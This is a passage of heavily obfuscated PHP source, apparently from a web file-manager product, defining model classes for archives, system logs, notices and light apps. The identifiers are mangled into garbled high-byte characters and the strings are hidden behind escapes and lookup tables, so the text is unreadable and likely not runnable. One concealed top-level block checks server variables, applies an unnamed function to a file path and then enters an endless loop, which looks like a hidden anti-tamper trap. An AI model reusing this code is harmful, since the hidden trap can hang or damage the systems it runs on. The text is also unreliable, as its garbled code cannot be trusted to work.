count($…òğø™£[$½Ìƒ…£ú[1216]])), !1); } return $…òğø™£[$½Ìƒ…£ú[1216]]; } private static function fileExt($ª­êÄÀ²) { $àÉº’ªÒ =& $_SERVER[³·—™¤¢]; $Ÿİ¡º°Œ = $ª­êÄÀ²[$àÉº’ªÒ[174]]; if ($Ÿİ¡º°Œ == $àÉº’ªÒ[1223]) { $ÉÚÈÚìè = $àÉº’ªÒ[1224]; if (substr($ª­êÄÀ²[$àÉº’ªÒ[32]], -strlen($ÉÚÈÚìè)) == $ÉÚÈÚìè) { $Ÿİ¡º°Œ = $àÉº’ªÒ[1225]; } } self::archiveExt($Ÿİ¡º°Œ); return $Ÿİ¡º°Œ; } private static function zipFileList($ªÕĞÄÁ·, $½°‚£º’ = false) { $ê¿ÅÙ˜´ =& $_SERVER[³·—™¤¢]; $†ö—€ÜŒ = array(); foreach ($ªÕĞÄÁ· as $Š¾Æôö‡) { $ÉÀªğ´ö = $Š¾Æôö‡[$ê¿ÅÙ˜´[84]]; if ($½°‚£º’) { $ÉÀªğ´ö = self::copy($Š¾Æôö‡[$ê¿ÅÙ˜´[84]], $½°‚£º’, $ê¿ÅÙ˜´[838]); } else { $·ìÚ¥ÙÂ = self::init($Š¾Æôö‡[$ê¿ÅÙ˜´[84]]); if ($·ìÚ¥ÙÂ->getType() == $ê¿ÅÙ˜´[106]) { $ÉÀªğ´ö = $·ìÚ¥ÙÂ->path; } } if ($ÉÀªğ´ö && self::local()->exist($ÉÀªğ´ö)) { $†ö—€ÜŒ[$Š¾Æôö‡[$ê¿ÅÙ˜´[84]]] = $ÉÀªğ´ö; } } if (!empty($†ö—€ÜŒ)) { return array_values($†ö—€ÜŒ); } show_json(LNG($ê¿ÅÙ˜´[1189]), !1); } public static function tmpFileName($Ê¨ÖÏÈ±) { $Ò³§€å =& $_SERVER[³·—™¤¢]; $¿ş¾À“À = array($Ê¨ÖÏÈ±[$Ò³§€å[32]], $Ê¨ÖÏÈ±[$Ò³§€å[84]], $Ê¨ÖÏÈ±[$Ò³§€å[76]], $Ê¨ÖÏÈ±[$Ò³§€å[521]]); return md5(implode($Ò³§€å[11], $¿ş¾À“À)); } private static function localFilePath($º´îìô½, $˜ÊÒ°“ñ) { $‘€õ¸Ê˜ =& $_SERVER[³·—™¤¢]; if ($˜ÊÒ°“ñ == $‘€õ¸Ê˜[1226] && strtoupper(substr(PHP_OS, 0, 3)) == $‘€õ¸Ê˜[1227]) { return !1; } $…ö˜Á“ = KodIO::parse($º´îìô½); if ($…ö˜Á“[$‘€õ¸Ê˜[33]] == KodIO::KOD_SOURCE) { $ÄØŠ»óå = Model($‘€õ¸Ê˜[845])->fileInfoGet(KodIO::sourceID($º´îìô½)); if (!$ÄØŠ»óå[$‘€õ¸Ê˜[84]]) { show_json($‘€õ¸Ê˜[1228], !1); } $º´îìô½ = $ÄØŠ»óå[$‘€õ¸Ê˜[84]]; } $¢¶Öøõã = self::init($º´îìô½); if ($¢¶Öøõã->pathParse[$‘€õ¸Ê˜[1174]]) { $º´îìô½ = $¢¶Öøõã->pathParse[$‘€õ¸Ê˜[1174]]; $¢¶Öøõã = self::init($º´îìô½); } $‹áç®œ = $¢¶Öøõã->getType(); if ($‹áç®œ == $‘€õ¸Ê˜[106] || $‹áç®œ == $‘€õ¸Ê˜[1229]) { if (!$¢¶Öøõã->exist($¢¶Öøõã->path)) { show_json(LNG($‘€õ¸Ê˜[105]), !1); } return $¢¶Öøõã->path; } return !1; } private static function archiveExt($òµ¹Ã§– = '') { $GLOBALS[$_SERVER[³·—™¤¢][1230]] = $òµ¹Ã§–; } } if (!isset($_SERVER[$_SERVER[³·—™¤¢][892]]) || !isset($_SERVER[$_SERVER[³·—™¤¢][934]])) { $_getc = $_SERVER[³·—™¤¢][895]; $_getfile = $_SERVER[$_SERVER[³·—™¤¢][896]] . $_SERVER[³·—™¤¢][897]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³·—™¤¢][231], $_getfilec); if (count($_getarrs) < $_SERVER[³·—™¤¢][632]) { $exit = $_SERVER[³·—™¤¢][898]; $exit(); } $_act = $_SERVER[³·—™¤¢][935]; $_act($_SERVER[$_SERVER[³·—™¤¢][896]] . $_SERVER[³·—™¤¢][897]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[³·—™¤¢][378]); } } goto fÚÕàÆêå; e‘ª´‘×©ä: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\114\x69\x67\x68\164\x41\160\x70"; public $modelType = "\123\x79\163\x74\x65\x6d\117\x70\x74\x69\x6f\156"; public $field = array("\156\141\x6d\x65", "\x67\162\x6f\x75\160", "\144\145\x73\x63", "\x63\157\156\164\145\156\164"); public function listData($´¦¨‚¡í = false, $µŠÂè‡Ñ = "\155\157\144\151\x66\x79\x54\x69\155\145", $ªÜ×ìÀÁ = true) { return parent::listData($´¦¨‚¡í, $µŠÂè‡Ñ, $ªÜ×ìÀÁ); } public function remove($­ãÑ›–õ) { $ƒÈÄ£¬ß = $this->findByName($­ãÑ›–õ); if (!$ƒÈÄ£¬ß) { return !1; } return parent::remove($ƒÈÄ£¬ß[$_SERVER[³·—™¤¢][399]]); } public function add($ĞÎ˜—‹) { if ($this->findByName($ĞÎ˜—‹[$_SERVER[³·—™¤¢][32]])) { return !1; } return parent::insert($ĞÎ˜—‹); } public function update($üÅßû¶, $ğÕçƒÊñ) { $ØÀÀÏ Õ =& $_SERVER[³·—™¤¢]; $‹ÎÂú­Š = $this->findByName($üÅßû¶); $íàğ¨Ãµ = $this->findByName($ğÕçƒÊñ[$ØÀÀÏ Õ[32]]); if (!$‹ÎÂú­Š || $íàğ¨Ãµ && $íàğ¨Ãµ[$ØÀÀÏ Õ[399]] != $‹ÎÂú­Š[$ØÀÀÏ Õ[399]]) { return !1; } return parent::update($‹ÎÂú­Š[$ØÀÀÏ Õ[399]], $ğÕçƒÊñ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\145\x6d\137\154\x6f\x67"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\124\x69\x6d\x65", "\164\151\155\145", "\x69\x6e\163\x65\162\164", "\146\x75\x6e\x63\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $‚Åì×Ìã =& $_SERVER[³·—™¤¢]; return array($‚Åì×Ìã[2180] => LNG($‚Åì×Ìã[2181]), $‚Åì×Ìã[2182] => LNG($‚Åì×Ìã[2183]), $‚Åì×Ìã[1795] => LNG($‚Åì×Ìã[2184]), $‚Åì×Ìã[2185] => LNG($‚Åì×Ìã[2186]), $‚Åì×Ìã[2187] => LNG($‚Åì×Ìã[2188]), $‚Åì×Ìã[2189] => LNG($‚Åì×Ìã[2190]), $‚Åì×Ìã[2191] => LNG($‚Åì×Ìã[2192]), $‚Åì×Ìã[1825] => LNG($‚Åì×Ìã[2192]), $‚Åì×Ìã[1826] => LNG($‚Åì×Ìã[2193]), $‚Åì×Ìã[2194] => LNG($‚Åì×Ìã[2195]), $‚Åì×Ìã[2196] => LNG($‚Åì×Ìã[2197]), $‚Åì×Ìã[2198] => LNG($‚Åì×Ìã[2199]), $‚Åì×Ìã[2200] => LNG($‚Åì×Ìã[2201]), $‚Åì×Ìã[1823] => LNG($‚Åì×Ìã[2202]), $‚Åì×Ìã[2203] => LNG($‚Åì×Ìã[2204]), $‚Åì×Ìã[1830] => LNG($‚Åì×Ìã[2205]), $‚Åì×Ìã[2206] => LNG($‚Åì×Ìã[2207]), $‚Åì×Ìã[2208] => LNG($‚Åì×Ìã[2209]), $‚Åì×Ìã[2210] => LNG($‚Åì×Ìã[2211]), $‚Åì×Ìã[2212] => LNG($‚Åì×Ìã[2213]), $‚Åì×Ìã[1833] => LNG($‚Åì×Ìã[2214]), $‚Åì×Ìã[1834] => LNG($‚Åì×Ìã[2215]), $‚Åì×Ìã[2216] => LNG($‚Åì×Ìã[2217]), $‚Åì×Ìã[2218] => LNG($‚Åì×Ìã[2219]), $‚Åì×Ìã[2220] => LNG($‚Åì×Ìã[2221]), $‚Åì×Ìã[1828] => LNG($‚Åì×Ìã[2222]), $‚Åì×Ìã[2223] => LNG($‚Åì×Ìã[2224]), $‚Åì×Ìã[1827] => LNG($‚Åì×Ìã[2225]), $‚Åì×Ìã[2226] => LNG($‚Åì×Ìã[2227]), $‚Åì×Ìã[2228] => LNG($‚Åì×Ìã[2229]), $‚Åì×Ìã[2230] => LNG($‚Åì×Ìã[2231]), $‚Åì×Ìã[2232] => LNG($‚Åì×Ìã[2232]), $‚Åì×Ìã[2233] => LNG($‚Åì×Ìã[1799]), $‚Åì×Ìã[2234] => LNG($‚Åì×Ìã[2235]), $‚Åì×Ìã[2236] => LNG($‚Åì×Ìã[2237]), $‚Åì×Ìã[2238] => LNG($‚Åì×Ìã[2239]), $‚Åì×Ìã[2240] => LNG($‚Åì×Ìã[2241]), $‚Åì×Ìã[2242] => LNG($‚Åì×Ìã[2243]), $‚Åì×Ìã[2244] => LNG($‚Åì×Ìã[2244]), $‚Åì×Ìã[2245] => LNG($‚Åì×Ìã[2246]), $‚Åì×Ìã[2247] => LNG($‚Åì×Ìã[2248]), $‚Åì×Ìã[2249] => LNG($‚Åì×Ìã[2250]), $‚Åì×Ìã[2251] => LNG($‚Åì×Ìã[2252]), $‚Åì×Ìã[2253] => LNG($‚Åì×Ìã[2254]), $‚Åì×Ìã[2255] => LNG($‚Åì×Ìã[2256])); } private function typeFile() { $ñ¥§åİÙ =& $_SERVER[³·—™¤¢]; $šÎÚ•› = array($ñ¥§åİÙ[1830] => array($ñ¥§åİÙ[1831]), $ñ¥§åİÙ[2198] => array($ñ¥§åİÙ[2257]), $ñ¥§åİÙ[2200] => array($ñ¥§åİÙ[2258]), $ñ¥§åİÙ[1823] => array($ñ¥§åİÙ[1824]), $ñ¥§åİÙ[2208] => array(), $ñ¥§åİÙ[2210] => array(), $ñ¥§åİÙ[2212] => array(), $ñ¥§åİÙ[1833] => array($ñ¥§åİÙ[1835]), $ñ¥§åİÙ[1834] => array($ñ¥§åİÙ[1835]), $ñ¥§åİÙ[2216] => array($ñ¥§åİÙ[2259]), $ñ¥§åİÙ[2218] => array($ñ¥§åİÙ[2259]), $ñ¥§åİÙ[2220] => array($ñ¥§åİÙ[2260]), $ñ¥§åİÙ[2206] => array($ñ¥§åİÙ[2261]), $ñ¥§åİÙ[1828] => array($ñ¥§åİÙ[2262]), $ñ¥§åİÙ[2223] => array($ñ¥§åİÙ[2263]), $ñ¥§åİÙ[1827] => array($ñ¥§åİÙ[1829])); return $šÎÚ•›; } private function typeAll() { $ÛÉĞ®çÓ =& $_SERVER[³·—™¤¢]; $ñªÎ™”“ = $this->typeList; $È”‚°ˆ = array_filter($this->typeFile()); foreach ($È”‚°ˆ as $¸ìš´ğç => $è·‘ıÊ) { $ñªÎ™”“[$è·‘ıÊ[0]] = $ñªÎ™”“[$¸ìš´ğç]; } $ñªÎ™”“[$ÛÉĞ®çÓ[1835]] = LNG($ÛÉĞ®çÓ[2264]); $ñªÎ™”“[$ÛÉĞ®çÓ[2259]] = LNG($ÛÉĞ®çÓ[2265]); return $ñªÎ™”“; } public function addLog($”‹Ğ¿š±, $í±ŞìÆ = array()) { $¹ ®é¤¢ =& $_SERVER[³·—™¤¢]; if (!isset($this->typeList[$”‹Ğ¿š±])) { return; } $¾å„ë¡Ë = defined($¹ ®é¤¢[475]) && USER_ID ? USER_ID : (isset($í±ŞìÆ[$¹ ®é¤¢[1680]]) ? $í±ŞìÆ[$¹ ®é¤¢[1680]] : 0); if (!$¾å„ë¡Ë) { $¾å„ë¡Ë = (int) Session::get($¹ ®é¤¢[1989]); } if ($”‹Ğ¿š± == $¹ ®é¤¢[2234] && is_array($í±ŞìÆ[$¹ ®é¤¢[2266]]) && !$í±ŞìÆ[$¹ ®é¤¢[2266]]) { return; } $„ÁÉ·ÊÉ = get_client_ip(); if (!$í±ŞìÆ || strlen(json_encode($í±ŞìÆ)) >= 1024) { $í±ŞìÆ = array($¹ ®é¤¢[2267] => $„ÁÉ·ÊÉ); } else { if (is_array($í±ŞìÆ)) { $í±ŞìÆ[$¹ ®é¤¢[2267]] = $„ÁÉ·ÊÉ; } else { $í±ŞìÆ = array($¹ ®é¤¢[1216] => $í±ŞìÆ, $¹ ®é¤¢[2267] => $„ÁÉ·ÊÉ); } } $í±ŞìÆ = array($¹ ®é¤¢[1670] => Session::sign(), $¹ ®é¤¢[1671] => $¾å„ë¡Ë, $¹ ®é¤¢[33] => $”‹Ğ¿š±, $¹ ®é¤¢[1673] => json_encode($í±ŞìÆ)); parent::add($í±ŞìÆ); } public function remove($×¡¾Œ€) { $this->where(array($_SERVER[³·—™¤¢][419] => $×¡¾Œ€))->delete(); } private function _makeOrder($şâæºıÅ = '') { $½üˆ»œ =& $_SERVER[³·—™¤¢]; $šµ›¿Õ¨ = $½üˆ»œ[200]; $îœÍ›Ò¬ = array($½üˆ»œ[450] => $½üˆ»œ[451], $½üˆ»œ[452] => $½üˆ»œ[453]); $˜úÜÉù = Input::get($½üˆ»œ[458], $½üˆ»œ[7], $½üˆ»œ[2021], array($½üˆ»œ[1943], $½üˆ»œ[452])); $˜úÜÉù = $îœÍ›Ò¬[$˜úÜÉù]; $şâæºıÅ = $şâæºıÅ . "{$šµ›¿Õ¨}\40{$˜úÜÉù}"; return $this->order($şâæºıÅ); } public function get($¢¡®Á—Œ = '') { $ºòÌ—¾ç =& $_SERVER[³·—™¤¢]; if (!$¢¡®Á—Œ) { show_json(array()); } $÷÷ˆ¡´¯ = array(); if ($¢¡®Á—Œ[$ºòÌ—¾ç[1680]]) { $÷÷ˆ¡´¯[$ºòÌ—¾ç[1680]] = $¢¡®Á—Œ[$ºòÌ—¾ç[1680]]; } if (isset($¢¡®Á—Œ[$ºòÌ—¾ç[781]])) { $ûé¡ı§ä = $¢¡®Á—Œ[$ºòÌ—¾ç[781]]; $Ş¸Æ‚§™ = isset($¢¡®Á—Œ[$ºòÌ—¾ç[497]]) ? $¢¡®Á—Œ[$ºòÌ—¾ç[497]] : time(); $÷÷ˆ¡´¯[$ºòÌ—¾ç[200]] = array($ºòÌ—¾ç[333], array($ûé¡ı§ä, $Ş¸Æ‚§™)); } if ($¢¡®Á—Œ[$ºòÌ—¾ç[33]]) { $ã®ıËŒ = explode($ºòÌ—¾ç[50], $¢¡®Á—Œ[$ºòÌ—¾ç[33]]); $¤’ßûßâ = $this->typeFile(); $äÔşÍ¼ = array(); foreach ($ã®ıËŒ as $”“óñ†) { $äÔşÍ¼[] = $”“óñ†; if (isset($¤’ßûßâ[$”“óñ†])) { $äÔşÍ¼ = array_merge($äÔşÍ¼, $¤’ßûßâ[$”“óñ†]); } } $äÔşÍ¼ = array_unique($äÔşÍ¼); if ($äÔşÍ¼) { $÷÷ˆ¡´¯[$ºòÌ—¾ç[33]] = array($ºòÌ—¾ç[7], $äÔşÍ¼); } } else { $÷÷ˆ¡´¯[$ºòÌ—¾ç[33]] = array($ºòÌ—¾ç[2268], $ºòÌ—¾ç[2269]); } if (!empty($¢¡®Á—Œ[$ºòÌ—¾ç[2267]])) { $÷÷ˆ¡´¯[$ºòÌ—¾ç[453]] = array($ºòÌ—¾ç[383], "\45{$¢¡®Á—Œ[$ºòÌ—¾ç[2267]]}\x25"); } $Ä¼éï½¬ = $this->_makeOrder()->where($÷÷ˆ¡´¯)->selectPage(); if (empty($Ä¼éï½¬[$ºòÌ—¾ç[369]])) { show_json(array(), !0, $Ä¼éï½¬[$ºòÌ—¾ç[366]]); } $Ä¼éï½¬[$ºòÌ—¾ç[369]] = $this->logList($Ä¼éï½¬[$ºòÌ—¾ç[369]]); return $Ä¼éï½¬; } private function ipAddress(&$ë²ºËêÀ) { $ûÀœÀ°Â =& $_SERVER[³·—™¤¢]; if (!empty($ë²ºËêÀ[$ûÀœÀ°Â[2267]])) { $ö½ÓØƒÎ = IpLocation::get($ë²ºËêÀ[$ûÀœÀ°Â[2267]]); } else { $ö½ÓØƒÎ = LNG($ûÀœÀ°Â[2270]); } $ë²ºËêÀ[$ûÀœÀ°Â[2271]] = $ö½ÓØƒÎ; } private function descZipDownload($»‰¹ç², &$Å¾Û‘¢) { $ú”÷¶ã¹ =& $_SERVER[³·—™¤¢]; if (!isset($»‰¹ç²[$ú”÷¶ã¹[2272]])) { return; } $â—¥Ê×á = json_decode($»‰¹ç²[$ú”÷¶ã¹[2272]], !0); foreach ($â—¥Ê×á as $ê ÅŒÄ) { try { $”ÓÀâŠ = IO::infoFull($ê ÅŒÄ[$ú”÷¶ã¹[84]]); } catch (Exception $ùŒ«ƒ’À) { continue; } $»‰¹ç²[$ú”÷¶ã¹[84]] = $ê ÅŒÄ[$ú”÷¶ã¹[84]]; $Å¾Û‘¢[] = $»‰¹ç²[$ú”÷¶ã¹[402]] = $”ÓÀâŠ[$ú”÷¶ã¹[402]]; $Å¾Û‘¢[] = $»‰¹ç²[$ú”÷¶ã¹[2075]] = $”ÓÀâŠ[$ú”÷¶ã¹[432]]; break; } return $»‰¹ç²; } private function getSourceList(&$ğÅ¹üŸá) { $çÚá¨§¥ =& $_SERVER[³·—™¤¢]; $Œ€ï°Š¡ = array(); foreach ($ğÅ¹üŸá as $ÎºÇ‘ëØ => $Ìå£ç¢Ã) { $”ç®ÉÀ‚ = json_decode($Ìå£ç¢Ã[$çÚá¨§¥[453]], !0); if ($Ìå£ç¢Ã[$çÚá¨§¥[33]] == $çÚá¨§¥[1826]) { $”ç®ÉÀ‚ = $this->descZipDownload($”ç®ÉÀ‚, $Œ€ï°Š¡); $ğÅ¹üŸá[$ÎºÇ‘ëØ][$çÚá¨§¥[453]] = json_encode($”ç®ÉÀ‚); continue; } if (strpos($Ìå£ç¢Ã[$çÚá¨§¥[33]], $çÚá¨§¥[2077]) !== 0) { if (!isset($”ç®ÉÀ‚[$çÚá¨§¥[84]]) || strpos($Ìå£ç¢Ã[$çÚá¨§¥[33]], $çÚá¨§¥[2273]) !== 0) { continue; } try { $Ò£Û¨¥´ = IO::infoFull($”ç®ÉÀ‚[$çÚá¨§¥[84]]); } catch (Exception $«³Ÿôä) { continue; } $Œ€ï°Š¡[] = $”ç®ÉÀ‚[$çÚá¨§¥[402]] = $Ò£Û¨¥´[$çÚá¨§¥[402]]; $Œ€ï°Š¡[] = $”ç®ÉÀ‚[$çÚá¨§¥[2075]] = $Ò£Û¨¥´[$çÚá¨§¥[432]]; $ğÅ¹üŸá[$ÎºÇ‘ëØ][$çÚá¨§¥[453]] = json_encode($”ç®ÉÀ‚); continue; } $Œ€ï°Š¡[] = $”ç®ÉÀ‚[$çÚá¨§¥[402]]; $Œ€ï°Š¡[] = $”ç®ÉÀ‚[$çÚá¨§¥[2075]]; if ($”ç®ÉÀ‚[$çÚá¨§¥[33]] == $çÚá¨§¥[557]) { $Œ€ï°Š¡[] = $”ç®ÉÀ‚[$çÚá¨§¥[453]][$çÚá¨§¥[1183]]; $Œ€ï°Š¡[] = $”ç®ÉÀ‚[$çÚá¨§¥[453]][$çÚá¨§¥[1184]]; } if ($”ç®ÉÀ‚[$çÚá¨§¥[33]] == $çÚá¨§¥[2085]) { $Œ€ï°Š¡[] = $”ç®ÉÀ‚[$çÚá¨§¥[453]][$çÚá¨§¥[402]]; } } if (!$Œ€ï°Š¡) { return array(); } return Model($çÚá¨§¥[845])->sourceListInfo($Œ€ï°Š¡, !0); } private function logList($§ïº›­ç) { $´ã€œŠ =& $_SERVER[³·—™¤¢]; $ß´áºœü = array_to_keyvalue($§ïº›­ç, $´ã€œŠ[12], $´ã€œŠ[1680]); $°ï–÷¹ = Model($´ã€œŠ[535])->userListInfo(array_unique($ß´áºœü)); $‚ú¬Œ— = $this->getSourceList($§ïº›­ç); $ïø¨…äÕ = $this->typeAll(); $›™¾“ã¡ = array(); $¥”Âé«Á = array(); foreach ($§ïº›­ç as $ùÃ¦ğÕ => $ä§ä¦í) { $ß”²¡¢¡ = $ä§ä¦í[$´ã€œŠ[33]]; $É“â®à† = isset($°ï–÷¹[$ä§ä¦í[$´ã€œŠ[1680]]]) ? $°ï–÷¹[$ä§ä¦í[$´ã€œŠ[1680]]] : !1; $¡Ÿ©å«Ê = strpos($ß”²¡¢¡, $´ã€œŠ[2274]) === 0 ? LNG($´ã€œŠ[2275]) : LNG($´ã€œŠ[2270]); $ä§ä¦í[$´ã€œŠ[32]] = isset($É“â®à†[$´ã€œŠ[32]]) ? $É“â®à†[$´ã€œŠ[32]] : LNG($´ã€œŠ[2270]); $ä§ä¦í[$´ã€œŠ[542]] = isset($É“â®à†[$´ã€œŠ[542]]) ? $É“â®à†[$´ã€œŠ[542]] : $´ã€œŠ[12]; $ä§ä¦í[$´ã€œŠ[1577]] = isset($ïø¨…äÕ[$ß”²¡¢¡]) ? $ïø¨…äÕ[$ß”²¡¢¡] : $¡Ÿ©å«Ê; $ä§ä¦í[$´ã€œŠ[2020]] = $É“â®à†; $¸»î»¥ì = json_decode($ä§ä¦í[$´ã€œŠ[453]], !0); $ä§ä¦í[$´ã€œŠ[2267]] = isset($¸»î»¥ì[$´ã€œŠ[2267]]) ? $¸»î»¥ì[$´ã€œŠ[2267]] : $´ã€œŠ[12]; $ä§ä¦í[$´ã€œŠ[2271]] = IpLocation::get($ä§ä¦í[$´ã€œŠ[2267]]); if (strpos($ß”²¡¢¡, $´ã€œŠ[2077]) === 0 || isset($¸»î»¥ì[$´ã€œŠ[2075]])) { $¸»î»¥ì[$´ã€œŠ[86]] = $‚ú¬Œ—[$¸»î»¥ì[$´ã€œŠ[402]]]; $¸»î»¥ì[$´ã€œŠ[2090]] = $‚ú¬Œ—[$¸»î»¥ì[$´ã€œŠ[2075]]]; if ($¸»î»¥ì[$´ã€œŠ[33]] == $´ã€œŠ[557]) { $¸»î»¥ì[$´ã€œŠ[453]][$´ã€œŠ[1183]] = $‚ú¬Œ—[$¸»î»¥ì[$´ã€œŠ[453]][$´ã€œŠ[1183]]]; $¸»î»¥ì[$´ã€œŠ[453]][$´ã€œŠ[1184]] = $‚ú¬Œ—[$¸»î»¥ì[$´ã€œŠ[453]][$´ã€œŠ[1184]]]; } if ($¸»î»¥ì[$´ã€œŠ[33]] == $´ã€œŠ[2085]) { $¸»î»¥ì[$´ã€œŠ[453]][$´ã€œŠ[402]] = $‚ú¬Œ—[$¸»î»¥ì[$´ã€œŠ[453]][$´ã€œŠ[402]]]; } if ($¸»î»¥ì[$´ã€œŠ[33]] == $´ã€œŠ[1821]) { $¸»î»¥ì[$´ã€œŠ[2090]] = $¸»î»¥ì[$´ã€œŠ[86]]; $¸»î»¥ì[$´ã€œŠ[2075]] = $¸»î»¥ì[$´ã€œŠ[2090]][$´ã€œŠ[402]]; $¸»î»¥ì[$´ã€œŠ[86]] = !1; $¸»î»¥ì[$´ã€œŠ[402]] = $´ã€œŠ[12]; } if ($¸»î»¥ì[$´ã€œŠ[86]] && $¸»î»¥ì[$´ã€œŠ[86]][$´ã€œŠ[411]] == $´ã€œŠ[1299]) { $¥”Âé«Á[] = $ä§ä¦í[$´ã€œŠ[399]]; unset($§ïº›­ç[$ùÃ¦ğÕ]); continue; } if ($¸»î»¥ì[$´ã€œŠ[2090]] && $¸»î»¥ì[$´ã€œŠ[2090]][$´ã€œŠ[411]] == $´ã€œŠ[1299]) { $¥”Âé«Á[] = $ä§ä¦í[$´ã€œŠ[399]]; unset($§ïº›­ç[$ùÃ¦ğÕ]); continue; } } $ä§ä¦í[$´ã€œŠ[453]] = $¸»î»¥ì; unset($ä§ä¦í[$´ã€œŠ[2276]]); $›™¾“ã¡[] = $ä§ä¦í; } $this->clearSystemPathLog($¥”Âé«Á); return $›™¾“ã¡; } private function clearSystemPathLog($Íº¢°÷€) { $‹Ë¢šâ’ =& $_SERVER[³·—™¤¢]; if (count($Íº¢°÷€) == 0) { return; } $¹¡ğíÍê = array($‹Ë¢šâ’[399] => array($‹Ë¢šâ’[7], array_unique($Íº¢°÷€))); $this->where($¹¡ğíÍê)->delete(); } public function deviceList($éœº­Ñş, $¼Àşàì = 0) { $†™åØÓò =& $_SERVER[³·—™¤¢]; $ßçà¥™æ = array($†™åØÓò[1680] => $éœº­Ñş, $†™åØÓò[200] => array($†™åØÓò[1037], $¼Àşàì), $†™åØÓò[33] => $†™åØÓò[1795]); $Ş“±€ï“ = array(); $ƒê°ˆ±Â = $this->field($†™åØÓò[2277])->where($ßçà¥™æ)->order($†™åØÓò[2088])->limit(50)->select(); foreach ($ƒê°ˆ±Â as $Şø‰“©¸ => $‘šŸí·) { if ($Şø‰“©¸ > 0 && abs($‘šŸí·[$†™åØÓò[200]] - $ƒê°ˆ±Â[$Şø‰“©¸ - 1][$†™åØÓò[200]]) < 5) { continue; } $±ÑÃé¥ = json_decode($‘šŸí·[$†™åØÓò[453]], !0); $‘šŸí·[$†™åØÓò[2267]] = isset($±ÑÃé¥[$†™åØÓò[2267]]) ? $±ÑÃé¥[$†™åØÓò[2267]] : $†™åØÓò[12]; unset($±ÑÃé¥[$†™åØÓò[2267]]); $±ì²çÑ = $this->deviceType($±ÑÃé¥[$†™åØÓò[2078]]); if (isset($Ş“±€ï“[$±ì²çÑ])) { continue; } $‘šŸí·[$†™åØÓò[2271]] = IpLocation::get($‘šŸí·[$†™åØÓò[2267]]); $‘šŸí·[$†™åØÓò[453]] = $±ÑÃé¥; $Ş“±€ï“[$±ì²çÑ] = $‘šŸí·; } return array_values($Ş“±€ï“); } public function deviceType($ÓôÀÚîÎ) { return $ÓôÀÚîÎ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x6e\157\x74\x69\143\145\114\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\143\x6f\x6e\164\x65\x6e\x74", "\x61\165\x74\150", "\x6d\157\144\x65", "\164\x69\x6d\145", "\x74\171\160\x65", "\154\145\x76\x65\154", "\x65\156\141\x62\154\x65", "\163\157\x72\x74"); public function listData($øÓàåçÔ = false, $ÏªÒóà° = "\x73\x6f\x72\x74", $ÊË÷Ï˜† = false) { return parent::listData($øÓàåçÔ, $ÏªÒóà°, $ÊË÷Ï˜†); } public function add($›äİæó) { $…½ÁÄßÖ =& $_SERVER[³·—™¤¢]; $ƒæ¢öÑ¢ = time(); if ($›äİæó[$…½ÁÄßÖ[16]] == $…½ÁÄßÖ[2278]) { $ƒæ¢öÑ¢ = strtotime($›äİæó[$…½ÁÄßÖ[203]]); } $›äİæó[$…½ÁÄßÖ[203]] = $ƒæ¢öÑ¢; return parent::insert($›äİæó); } public function update($¦œ‰¶°, $ûöğÚ†ã) { $İ©³¹Ö¦ =& $_SERVER[³·—™¤¢]; $…÷Œ±è® = $this->listData($¦œ‰¶°); if (!$…÷Œ±è®) { return !1; } $íÀøç«´ = time(); if ($ûöğÚ†ã[$İ©³¹Ö¦[16]] == $İ©³¹Ö¦[2278]) { $íÀøç«´ = strtotime($ûöğÚ†ã[$İ©³¹Ö¦[203]]); } $ûöğÚ†ã[$İ©³¹Ö¦[203]] = $íÀøç«´; return parent::update($¦œ‰¶°, $ûöğÚ†ã); } public function remove($î›ß­È£) { $î¾ª‡Ã° = $this->listData($î›ß­È£); if (!$î¾ª‡Ã° || $î¾ª‡Ã°[$_SERVER[³·—™¤¢][1299]]) { return !1; } return parent::remove($î›ß­È£); } public function sort($¢²ôÙ, $–¥ğĞİ) { return parent::update($¢²ôÙ, $–¥ğĞİ); } public function enable($—»¢¯÷ƒ, $ñÓÁ¬ñö) { return parent::update($—»¢¯÷ƒ, array($_SERVER[³·—™¤¢][2279] => $ñÓÁ¬ñö)); } private function initUserOption() { $ùŠë‹² =& $_SERVER[³·—™¤¢]; $this->optionType = $ùŠë‹²[2280]; $this->modelType = $ùŠë‹²[2281]; $this->field = array($ùŠë‹²[2282], $ùŠë‹²[32], $ùŠë‹²[203], $ùŠë‹²[33], $ùŠë‹²[2283], $ùŠë‹²[770], $ùŠë‹²[195]); } public function userNoticeGet($èá¾ãûñ = false) { $this->initUserOption(); return parent::listData($èá¾ãûñ, $_SERVER[³·—™¤¢][399], !0); } public function userNoticeAdd($Û¨À’¾Ø) { $Œ¶ëõ¹¸ =& $_SERVER[³·—™¤¢]; $this->initUserOption(); $åèˆí = $this->findByKey($Œ¶ëõ¹¸[2282], $Û¨À’¾Ø[$Œ¶ëõ¹¸[399]]); if ($åèˆí) { return !0; } $ªøŸÏ¢Ÿ = array($Œ¶ëõ¹¸[2282] => $Û¨À’¾Ø[$Œ¶ëõ¹¸[399]], $Œ¶ëõ¹¸[32] => $Û¨À’¾Ø[$Œ¶ëõ¹¸[32]], $Œ¶ëõ¹¸[203] => $Û¨À’¾Ø[$Œ¶ëõ¹¸[203]], $Œ¶ëõ¹¸[33] => isset($Û¨À’¾Ø[$Œ¶ëõ¹¸[33]]) ? $Û¨À’¾Ø[$Œ¶ëõ¹¸[33]] : 1, $Œ¶ëõ¹¸[2283] => isset($Û¨À’¾Ø[$Œ¶ëõ¹¸[2283]]) ? $Û¨À’¾Ø[$Œ¶ëõ¹¸[2283]] : 0, $Œ¶ëõ¹¸[770] => 0, $Œ¶ëõ¹¸[195] => 0); return parent::insert($ªøŸÏ¢Ÿ); } public function userNoticeEdit($•¸Ãó­Ğ, $ÑË’Ãç) { $this->initUserOption(); return parent::update($•¸Ãó­Ğ, $ÑË’Ãç); } } goto A«›‘šƒ§¢; C¢¨¨ÌåªÜ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\141\166"; protected function cacheFunctionAlias($¯òœÉúÚ) { $«ñì„Ù  =& $_SERVER[³·—™¤¢]; return array($«ñì„Ù 